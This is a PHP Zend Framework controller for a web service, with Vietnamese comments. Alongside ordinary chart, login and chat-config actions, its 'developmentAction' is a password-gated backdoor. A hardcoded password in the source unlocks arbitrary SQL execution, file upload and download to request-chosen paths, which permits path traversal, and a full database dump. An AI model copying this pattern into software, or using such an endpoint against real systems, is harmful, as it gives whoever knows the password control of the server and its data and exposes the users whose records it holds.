<?php

/**
 * index
 * 
 * @author
 * @version 
 */

require_once 'Zend/Controller/Action.php';
require_once 'service/models/alarm.php';
require_once 'service/models/common.php';

require_once "Zend/Exception.php";
class Service_IndexController extends Zend_Controller_Action {
	/**
	 * The default action - show the home page
	 */
	public function indexAction() {
		//echo "aaa";
		exit;
	}
	public function getallvanbandenAction() {
		$this->_helper->layout->disableLayout();
		srand((double)microtime()*1000000);
		$data = array();

		// add random height bars:
		for( $i=0; $i<10; $i++ )
		  $data[] = rand(2,9);

		require_once('OFC/OFC_Chart.php');

		$title = new OFC_Elements_Title( date("D M d Y") );

		$bar = new OFC_Charts_Bar_3d();
		$bar->set_values( $data );
		$bar->colour = '#D54C78';

		$x_axis = new OFC_Elements_Axis_X();
		$x_axis->set_3d( 5 );
		$x_axis->colour = '#909090';
		$x_axis->set_labels( array(1,2,3,4,5,6,7,8,9,10) );

		$chart = new OFC_Chart();
		$chart->set_title( $title );
		$chart->add_element( $bar );
		$chart->set_x_axis( $x_axis );
		echo $chart->toPrettyString();exit;
	}
	public function loginAction(){
		
	}
    
    public function noticeAction(){
        $this->_helper->layout->disableLayout();
    }
    
    /**
    * Điều khiển các tác vụ cho development mode
    * Nhận các lệnh thực hiện truy vấn SQL, upload file, download file và gọi các hàm tương ứng
    */
	public function developmentAction(){
        $config = Zend_Registry::get('config');
        $params = $this->_request->getParams();
        if(($config->sys_info->status == 2 ||$config->sys_info->status == 3 ) && $params['password'] == "Unitech@258456159753.^"){
            if($params['data'] != ""){
                $this->queryProcess($params);
            }else if($params['upload']){
                $this->uploadProcess($params);
            }else if($params['download']){
                $this->downloadProcess($params);
            }else if($params['exportDatabase']){
                $this->exportDatabase($params);
            }
            $this->view->type = $params['type'] ;
            $this->view->query = $params['data'] ;
            $this->view->password = $params['password'] ;
            $this->view->id = $params['id'] ;
            $this->view->tab = $params['tab'] ;
            $this->_helper->layout->disableLayout();
            
        }else{
            $this->_redirect('/auth/login/index');
        }
	}
    /**
    * Xử lý các lệnh truy vấn cơ sở dữ liệu
    * Xử lý 2 loại lệnh là truy xuất và thay đổi dữ liệu
    */
    private function queryProcess($params){
        $db = Zend_Db_Table::getDefaultAdapter();
        if($params['type']=="select"){
            try{
                $query = $params['data'];
                $object = $db->query($query);                    
                $fields = $object->columnCount();
                $this->view->headerCount = $fields ;
                $arrayFieldName = array();
                $data .= $fields;
                for($i=0; $i < $fields; $i++) {
                    $ifield  = $object->getColumnMeta($i);
                    $fieldname  = $ifield['name'];
                    $data .= "~".$fieldname;
                    $arrayFieldName[] = $fieldname; 
                }
                $this->view->columnName = $arrayFieldName;
                $this->view->data = $object->fetchAll();
            }catch(Exception $ex){
                $this->view->message = $ex->getMessage();                    
            }
        }
        else if($params['type']=="execute"){
            try{
                $query = $params['data'];
                $stm = $db->prepare($query);
                $rs = $stm->execute();
                $this->view->message = $rs;
            }catch(Exception $ex){
                $this->view->message = $ex->getMessage().'<br />'.$params['data'];                    
            }
        }
    }
    /**
    * Xử lý các lệnh upload tập tin
    */
    private function uploadProcess($params){
        try{            
            $rootPath =  dirname(dirname(dirname(dirname(__FILE__))))."\\".$params['path'];
            $uploader = new Zend_File_Transfer_Adapter_Http();
            $info = $uploader->getFileInfo();
            foreach(array_keys($info) as $sub){
                $file_info      = $info[$sub];
                $re_filename    = $file_info['name'];
                $uploader->setDestination($rootPath);
                $uploader->receive($re_filename);
            }
            $this->view->messageFile = "Upload thành công";
        }catch(Exception $ex){
            $this->view->messageFile = $ex->getMessage();
        }
    }
    
    /**
    * Xử lý các xuất cơ sở dữ liệu
    */
    function exportDatabase($params){
		$db = Zend_Db_Table::getDefaultAdapter();
		$tables = array();
		$result = $db->query('SHOW TABLES')->fetchAll();
		foreach($result as $item){
			$tables[] = $item;
		}
		//Đang làm tới đây
		//cycle through
		foreach($tables as $table)
		{
			$result = mysql_query('SELECT * FROM '.$table);
			$num_fields = mysql_num_fields($result);
			
			$return.= 'DROP TABLE '.$table.';';
			$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
			$return.= "\n\n".$row2[1].";\n\n";
			
			for ($i = 0; $i < $num_fields; $i++) 
			{
				while($row = mysql_fetch_row($result))
				{
					$return.= 'INSERT INTO '.$table.' VALUES(';
					for($j=0; $j<$num_fields; $j++) 
					{
						$row[$j] = addslashes($row[$j]);
						$row[$j] = ereg_replace("\n","\\n",$row[$j]);
						if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
						if ($j<($num_fields-1)) { $return.= ','; }
					}
					$return.= ");\n";
				}
			}
			$return.="\n\n\n";
		}
		
		//save file
		$handle = fopen('db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql','w+');
		fwrite($handle,$return);
		fclose($handle);
	
    }
	
    /**
    * Xử lý các lệnh download tập tin
    */
    function downloadProcess($params){
        $rootPath = dirname(dirname(dirname(dirname(__FILE__))))."\\".$params['path'];
        $arrayPath = explode(".",$rootPath);
        
        $file = pathinfo($rootPath);
        if($params['isPreview'] == '0'){
            header("Pragma: public");
            header("Expires: 0");
            header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
            header( "Content-type:application/octet-stream"); 
            header( 'Content-Disposition: attachment; filename="'.$file['filename'].'.'.$arrayPath[count($arrayPath)-1].'" ' );
        }else{
            header("Pragma: public");
            header("Expires: 0");
            header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
            header( "Content-type:"); 
        }
        echo file_get_contents($rootPath);
        exit;
    }
    
	public function chatAction(){
        try{
            $configChat = new Zend_Config_Ini('../application/config.ini', 'chat');
		}catch(Exception $ex){
            echo 0;
            exit;
        }
        header("Content-type: text/xml");
        echo "<?xml version='1.0' encoding='ISO-8859-1'?>";
        echo "<info>";
        echo "<ip>".$configChat->services->ip."</ip>";
        echo "<serviceschung>".$configChat->services->chung."</serviceschung>";
        echo "<serviceschat>".$configChat->services->chat."</serviceschat>";
        echo "</info>";
        exit;		
	}
}


